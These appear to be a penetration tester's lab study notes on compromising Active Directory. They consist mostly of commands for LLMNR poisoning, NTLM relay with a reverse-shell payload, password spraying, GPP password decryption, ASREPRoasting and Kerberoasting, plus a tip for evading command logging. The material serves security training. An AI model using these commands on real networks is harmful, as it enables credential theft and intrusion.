There is no "one way", we need to go back and furth in the phases, roll back to the first one even with valid credentials, skip one and comeback later to it, etc...
<p> The important thing is to make sure if stuck is to check all step done till the point where got stuck. </p>

# No Credentials
## Domain Enumeration
### Identifying Hosts
```bash
$ sudo -E wireshark

$ sudo tcpdump -i ens224 

$ sudo responder -I ens224 -A 

$ fping -asgq 172.16.5.0/23
```

## Scan Alive hosts
Check [nmap](../Enumeration/Discovery/Nmap.md)

> Focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos to find DC ip.

## Making a Target User List

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

### SMB NULL Session to Pull User List
If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.

It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.

Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.

```bash
# Using enum4linux
$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient
$ rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 

# Using CrackMapExec
$ crackmapexec smb 172.16.5.5 --users
$ awk '{ print $5 }' users.txt | cut -d'\' -f2 >> validusers.txt
```

### Gathering Users with LDAP Anonymous
```bash
# Using ldapsearch
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "


## Using windapsearch

$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Enumerating Users with Kerbrute
```bash
$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

grep -o '[a-zA-Z0-9._%+-]\+@[a-zA-Z0-9.-]\+\.[a-zA-Z]\{2,6\}' kerb.txt
cut -d "@" -f 1 your_file.txt
```

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.

## LLMNR/NBT-NS Poisoning 
Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.


### [Responder](https://github.com/lgandx/Responder)
```bash
$ sudo responder -I ens224 
$ sudo responder -I ens224 -w -d
```

/usr/share/responder/logs


### [Inveigh](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)
If we end up with a Windows host as our attack box,or our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder

```powershell
PS > Import-Module .\Inveigh.ps1
PS > (Get-Command Invoke-Inveigh).Parameters

PS > Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master)

Press ESC to enter/exit
help
```powershell
PS > .\Inveigh.exe
```

If a NTLM hash is found, next step will be to crack it offline using hashcat.

### Cracking an NTLMv2 Hash With Hashcat
Check [BruteForce](../BruteForce/BruteForce.md#Hashcat)

### Relay
If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.

First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).

```
$ cat /etc/responder/Responder.conf | grep 'SMB ='
```

We can create a PowerShell reverse shell 
```bash
$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <revshell> '

$ nc -lvnp 9001
```

## Low Hanging Fruits
### ZeroLogon

### Credentials in SMB Shares and SYSVOL Scripts
The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.

#### Discovering 
```
PS > ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

### Group Policy Preferences (GPP) Passwords
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.
- These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

#### Locating & Retrieving GPP Passwords with CrackMapExec
```bash
$ crackmapexec smb -L | grep gpp
```

#### Decrypting the Password with gpp-decrypt
```bash
$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1, the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.

* * *

# Clear Text Password 
## Check for Password Reuse
[ldap,mssql,smb,ssh,winrm]
```bash
$ crackmapexec <protocol> hosts.lst -u <username> -p <password>
```


## Enumerating the Password Policy
* With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.

### Linux
```bash
$ crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --pass-pol
```

#### SMB NULL Sessions
SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.

```bash
# Using rpcclient
$ rpcclient -U "" -N <DC>
rpcclient $> querydominfo # check SMB for more queries


# Using enum4linux
$ enum4linux -P <DC>


# Using enum4linux-ng
$ enum4linux-ng -P <DC> -oA <FILE>
$ cat <FILE>.json 


# LDAP Anonymous Bind
$ ldapsearch -h <DC> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Windows
#### Enumerating Null Session
```powershell
> net use \\DC01\ipc$ "" /u:""

# Using net.exe
> net accounts

# Using PowerView
PS > import-module .\PowerView.ps1
> Get-DomainPolicy
```

## Password Spraying
Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.

### Linux
Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.

```bash
# Using a Bash one-liner
$for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Using Kerbrute 
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1


# Using CrackMapExec 
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p password.txt --no-bruteforce| grep + 

## Validating the Credentials with CrackMapExec
$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

## Local Administrator Password Reuse
$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Windows
#### Using DomainPasswordSpray.ps1
```powershell
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## ASREPRoasting
It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.


ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.

### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```powershell
PS > Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.

### Retrieving AS-REP in Proper Format using Rubeus
```powershell
PS > .\Rubeus.exe asreproast /user:<USERNAME> /nowrap /format:<hashcat|john> /outfile:<output_hashes_file>
```

When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

### Retrieving the AS-REP Using Kerbrute
```bash
$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.

### Hunting for Users with Kerberoast Pre-auth Not Required
```bash
$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

# check ASREPRoast for all domain users (credentials required)
$ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
$ python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.

## Cracking the Hash Offline with Hashcat
```bash
$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```

* * *

# Got Domain Account with valid credentials (Ticket, Hash or Password) 
## Credentialed Enumeration 
```bash
# Domain User Enumeration
$ sudo crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --users
$ awk -F 'INLANEFREIGHT.LOCAL\\\\' '{print $2}' crack.txt | awk '{print $1}' > new_crack.txt

$ crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --users >> user.txt
$ awk '{ print $5 }' users.txt | cut -d'\' -f2 >> validusers.txt

$ GetADUsers.py -all -dc-ip <dc_ip> <DOMAIN>/<USERNAME> 

# Domain Group Enumeration
$ sudo crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --groups


# Logged On Users
"""
local admin because (Pwn3d!)
"""
$ sudo crackmapexec smb <MACHINE_IP> -u <USERNAME> -p <PASSWORD>2 --loggedon-users

# SMB shares 
Check SMB service 

# rpcclient
Check SMB service 

# Windapsearch
## Domain Admins
$ python3 windapsearch.py --dc-ip <DC_IP> -u <USERNAME>@<DOMAIN> -p <PASSWORD> --da

## Privileged Users
$ python3 windapsearch.py --dc-ip <DC_IP> -u <USERNAME>@<DOMAIN> -p <PASSWORD> -PU
```

### Bloodhound.py [https://github.com/fox-it/BloodHound.py]
Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language. The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

```bash
$ sudo bloodhound-python -u <USERNAME> -p <PASSWORD> -ns <DC_IP> -d inlanefreight.local -c all 

# Upload the Zip File into the BloodHound GUI**
$ sudo neo4j start (kali:neo4j, neo4j:kali)
$ zip -r ilfreight_bh.zip *.json

$ bloodhound 
```

### ActiveDirectory PowerShell Module
```powershell
PS > Get-Module

# Load ActiveDirectory Module
PS > Import-Module ActiveDirectory

# Group Enumeration
PS > Get-ADGroup -Filter * | select name

# Detailed Group Info
PS > Get-ADGroup -Identity "Backup Operators"

# Group Membership
PS > Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1]
```bash
# Domain User Information
PS > Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursive Group Membership
PS >  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one.
## Testing for Local Admin Access
PS > Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Finding Users With SPN Set (kerberostables)
PS > Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView [https://github.com/dmchell/SharpView]
```powershell
PS > .\SharpView.exe Get-DomainUser -Identity forend
```

### Snaffler [https://github.com/SnaffCon/Snaffler]
Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.
```powershell
PS > .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

### BloodHound [https://github.com/BloodHoundAD/BloodHound]
#### SharpHound [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors]
```powershell
PS > .\SharpHound.exe -c All --zipfilename ILFREIGHT
PS > .\SharpHound.exe -c All --zipfilename ILFREIGHT --ldapusername AB920 --ldappassword weasal
```

### Living Off the Land
```powershell
# Quick Checks Using PowerShell
whoami /groups

PS > Get-Module
PS > Get-ExecutionPolicy -List
PS > Get-ChildItem Env: | ft key,value


# Downgrade Powershell
PS > Get-host
PS > powershell.exe -version 2
PS > Get-host
PS > get-module

# Firewall Checks
PS > netsh advfirewall show allprofiles


# Windows Defender Check (from CMD.exe)
> sc query windefend

# Get-MpComputerStatus
PS > Get-MpComputerStatus

# Am I Alone?
'
When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
'

# Using qwinsta
PS > qwinsta
```

#### Network Information

|Networking Commands            |   Description                                 
|------------------------------ | ---------------------------------------------
|arp -a	Lists all               |known hosts stored in the arp table.
|ipconfig /all	                |Prints out adapter settings for the host. We can figure out the network segment from here.
|route print	                |Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
|netsh advfirewall show state   |Displays the status of the host's firewall. We can determine if it is active and filtering traffic.

```bash
# Using arp -a
PS > arp -a

# Viewing the Routing Table
PS > route print

'
Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.
'
```

#### Windows Management Instrumentation (WMI)
##### Quick WMI checks
|Command | 	Description
|------------------------------ | -----------------------------
|wmic qfe get Caption,Description,HotFixID,InstalledOn	Prints the patch level and description of the Hotfixes applied
|wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	Displays basic host information to include any attributes within the list
|wmic process list /format:list	A listing of all processes on host
|wmic ntdomain list /format:list	Displays information about the Domain and Domain Controllers
|wmic useraccount list /format:list	Displays information about all local accounts and any domain accounts that have logged into the device
|wmic group list /format:list	Information about all local groups
|wmic sysaccount list /format:list	Dumps information about any system accounts that are being used as service accounts.



#### Net Commands
| Command |	Description
|------------------------------ | -----------------------------
| net accounts	| Information about password requirements
| net accounts /domain	 | Password and lockout policy
| net group /domain	| Information about domain groups
| net group "Domain Admins" /domain	| List users with domain admin privileges
| net group "domain computers" /domain	| List of PCs connected to the domain
| net group "Domain Controllers" /domain	| List PC accounts of domains controllers
| net group <domain_group_name> /domain	| User that belongs to the group
| net groups /domain	| List of domain groups
| net localgroup	| All available groups
| net localgroup administrators /domain	| List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
| net localgroup Administrators	| Information about a group (admins)
| net localgroup administrators [username] /add	| Add user to administrators
| net share |	Check current shares
| net user <ACCOUNT_NAME> /domain	| Get information about a user within the domain
| net user /domain	| List all users of the domain
| net user %username%	| Information about the current user
| net use x: \computer\share	| Mount the share locally
| net view	| Get a list of computers
| net view /all /domain[:domainname]	| Shares on the domains
| net view \computer /ALL	| List shares of a computer
| net view /domain	| List of PCs of the domain

##### Net Commands Trick
If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.

#### Dsquery
```powershell
# User Search
PS > dsquery user

# Computer Search
PS > dsquery computer

# Wildcard Search
PS > dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

# Users With Specific Attributes Set (PASSWD_NOTREQD)
PS > dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
PS > dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

* * *

## Kerberoasting 
Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

### Linux
#### Kerberoasting - Performing the Attack
Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s GetUserSPNs.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py] from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1], Rubeus[https://github.com/GhostPack/Rubeus], and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

#### Kerberoasting with GetUserSPNs.py
`A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.`

We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.


```bash
# Listing SPN Accounts with GetUserSPNs.py
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME>

"""
We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
"""
# Requesting all TGS Tickets
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -request

"""
We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
"""
# Requesting a Single TGS ticket
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -request-user <DC_USER>

# Saving the TGS Ticket to an Output File
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -request-user <DC_USER> -outputfile <FILENAME>
```

### Windows
#### Kerberoasting - Semi Manual method
##### Enumerating SPNs with setspn.exe
```
> setspn.exe -Q */*
``` 

**Targeting a Single User**
```
> Add-Type -AssemblyName System.IdentityModel
> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

**Retrieving All Tickets Using setspn.exe**
```
PS > setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

##### Extracting Tickets from Memory with Mimikatz
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  

```

**Preparing the Base64 Blob for Cracking**
```
$ echo "<base64 blob>" |  tr -d \\n 
```

**Placing the Output into a File as .kirbi**
```
$ cat encoded_file | base64 -d > sqldev.kirbi
```

**Extracting the Kerberos Ticket using kirbi2john.py**
```
$ python2.7 kirbi2john.py sqldev.kirbi
```

**Modifiying crack_file for Hashcat**
```
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

#### Using PowerView to Extract TGS Tickets [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1]
```powershell
PS > Import-Module .\PowerView.ps1

# Get Kerberoastable acconts
PS > Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
PS > Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
PS > Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# Viewing the Contents of the .CSV File
PS > cat .\ilfreight_tgs.csv
```

We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.

#### Using Rubeus [https://github.com/GhostPack/Rubeus]
```powershell
PS > .\Rubeus.exe

# Using the /stats Flag
PS > .\Rubeus.exe kerberoast /stats

"""
If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.
"""

# Using the /nowrap Flag
PS > .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
PS > .\Rubeus.exe kerberoast /nowrap

# Exporting to file
PS > .\Rubeus.exe kerberoast /outfile:out.txt
```

### Cracking the Ticket Offline with Hashcat
#### A Note on Encryption Types
`The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.`

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.

```
PS > .\Rubeus.exe kerberoast /user:testspn /nowrap
```

```
PS > Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
